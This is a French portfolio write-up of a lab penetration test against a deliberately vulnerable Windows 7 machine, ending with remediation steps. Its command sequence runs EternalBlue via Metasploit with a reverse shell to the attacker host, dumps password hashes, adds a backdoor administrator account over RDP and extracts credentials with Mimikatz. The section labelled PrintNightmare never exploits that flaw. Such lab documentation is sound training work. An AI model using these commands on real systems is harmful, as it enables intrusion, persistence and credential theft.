Sous-projet 3 : Exploitation de Vulnérabilités Système

Projet — démonstration d'une chaîne d'attaque complète sur une machine Windows vulnérable
Description Démarche Résultats Compétences

Description du Projet

Ce projet fait une exploitation de vulnérabilités système connues (CVE) sur un environnement Windows. Le but était de simuler une intrusion complète, de la compromission initiale via un exploit réseau à l'escalade de privilèges, l'établissement de la persistance et l'exfiltration d'identifiants.

Objectif

L'objectif était de compromettre entièrement une machine Windows 7 (192.168.45.30) intentionnellement vulnérable, en exploitant deux failles critiques distinctes : EternalBlue (CVE-2017-0144) et PrintNightmare (CVE-2021-34527). La mission consistait à obtenir un accès initial avec des privilèges élevés, puis à utiliser cet accès pour établir un point d'ancrage persistant et exfiltrer les identifiants des utilisateurs, démontrant ainsi un contrôle total sur le système.

Démarche et Outils

Une chaîne d'attaque en plusieurs étapes a été exécutée depuis la machine Kali Linux (192.168.1.101) en utilisant des outils de pentesting standards comme Metasploit et Mimikatz.

1. Exploitation d'EternalBlue (CVE-2017-0144)

Reconnaissance

# Scan initial pour identifier les ports ouverts
nmap -sS 192.168.45.30

# Vérification spécifique du port SMB
nmap -p 445 --script smb-os-discovery 192.168.45.30

Scan de Vulnérabilité

# Utilisation du module Metasploit pour vérifier la vulnérabilité
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.45.30
run

Exploitation

# Configuration de l'exploit EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.45.30
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.101
set LPORT 4444
exploit

2. Post-exploitation, Escalade de Privilèges et Persistance

Extraction des Hashs

# Dans la session Meterpreter
meterpreter > hashdump

Établissement de la Persistance RDP

# Activation du RDP
meterpreter > run post/windows/manage/enable_rdp

# Création d'un utilisateur administrateur
meterpreter > shell
C:\> net user attacker Password123! /add
C:\> net localgroup Administrators attacker /add

Connexion RDP

# Connexion depuis Kali Linux
xfreerdp /v:192.168.45.30 /u:attacker /p:Password123!

3. Exploitation de PrintNightmare (CVE-2021-34527)

Vérification du Service Spooler

# Vérification que le service d'impression est actif
sc query spooler

Exécution de Mimikatz

# Transfert de Mimikatz vers la machine cible
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\temp\\

# Exécution et extraction des identifiants
meterpreter > shell
C:\temp> mimikatz.exe
mimikatz # sekurlsa::logonpasswords

Résultats et Livrables

Démonstrations Réalisées

  • Démonstration "pas à pas" de l'exploitation complète
  • Commandes Metasploit documentées pour le scan et l'exploitation d'EternalBlue
  • Workflow complet de la compromission à la persistance

Recommandations de Correctifs

Pour EternalBlue

# Désactivation de SMBv1 (PowerShell Admin)
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Mise à jour du système
Install-WindowsUpdate -AcceptAll -AutoReboot

Pour PrintNightmare

# Désactivation du service Spooler si non essentiel
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
